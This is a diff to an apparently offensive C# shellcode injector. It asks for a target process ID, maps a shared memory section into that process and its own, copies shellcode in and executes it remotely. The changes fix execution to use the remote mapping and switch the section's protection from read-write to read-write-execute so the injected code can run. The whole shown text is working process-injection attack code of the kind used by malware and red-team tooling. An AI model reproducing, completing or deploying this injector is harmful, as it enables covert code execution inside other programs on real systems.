@@ -204,11 +204,11 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                             Console.Write("Enter a process ID: ");
                             PID = uint.Parse(Console.ReadLine());
                             phandle = DefaultInjector.ProcessHandler(PID, oBJECT_ATTRIBUTES, cLIENT_ID);
-                            IntPtr sectionHandle = SectionMapping.createSection();
-                            IntPtr local_address = SectionMapping.MapSection(sectionHandle, GetCurrentProcess());
-                            IntPtr remote_address = SectionMapping.MapSection(sectionHandle, phandle);
-                            result = DefaultInjector.injectShellcode(GetCurrentProcess(), local_address, shellcode, PID);   
-                            DefaultInjector.executeShellcode(phandle, local_address);
+                            IntPtr sectionHandle = SectionMapping.createSection();                   
+                            IntPtr local_address = SectionMapping.MapSection(sectionHandle, GetCurrentProcess());                       
+                            IntPtr remote_address = SectionMapping.MapSection(sectionHandle, phandle);    
+                            result = DefaultInjector.injectShellcode(GetCurrentProcess(), local_address, shellcode, PID);
+                            DefaultInjector.executeShellcode(phandle, remote_address);
                             NtClose(phandle);
                             Console.ReadLine();
                             valid = 1;
@@ -305,15 +305,16 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                 }
                 public static IntPtr MapSection(IntPtr sectionHandle, IntPtr remoteProcHandle)
                 {
+
                     ulong optional = 0;
                     ulong viewSize = 0;
-                    uint PAGE_READWRITE = 0X04;
+                    uint PAGE_RWX = 0x40;
                     uint MEM_RESERVE = 0x00002000;
                     uint success_code;
                     if (remoteProcHandle == GetCurrentProcess())
                     {
                         IntPtr localbaseAddress = IntPtr.Zero;
-                        success_code = NtMapViewOfSection(sectionHandle, remoteProcHandle, ref localbaseAddress, UIntPtr.Zero, UIntPtr.Zero,  ref optional, ref viewSize, 2, 0, PAGE_READWRITE);
+                        success_code = NtMapViewOfSection(sectionHandle, remoteProcHandle, ref localbaseAddress, UIntPtr.Zero, UIntPtr.Zero,  ref optional, ref viewSize, 2, 0, PAGE_RWX);
                         Console.WriteLine($"[+] Successfully mapped local section at 0x{localbaseAddress.ToString("X")}");
                         return localbaseAddress;
 
@@ -321,7 +322,7 @@ ___) (__| )  \  |\_)  ) | (____/\ (____/\  | |  | (___) | ) \ \__
                     else
                     {
                         IntPtr remotebaseAddress = IntPtr.Zero;
-                        success_code = NtMapViewOfSection(sectionHandle, remoteProcHandle, ref remotebaseAddress, UIntPtr.Zero, UIntPtr.Zero,  ref optional, ref viewSize, 2, 0, PAGE_READWRITE);
+                        success_code = NtMapViewOfSection(sectionHandle, remoteProcHandle, ref remotebaseAddress, UIntPtr.Zero, UIntPtr.Zero,  ref optional, ref viewSize, 2, 0, PAGE_RWX);
                         Console.WriteLine($"[+] Successfully mapped remote section at 0x{remotebaseAddress.ToString("X")}");
                         return remotebaseAddress;
                     }
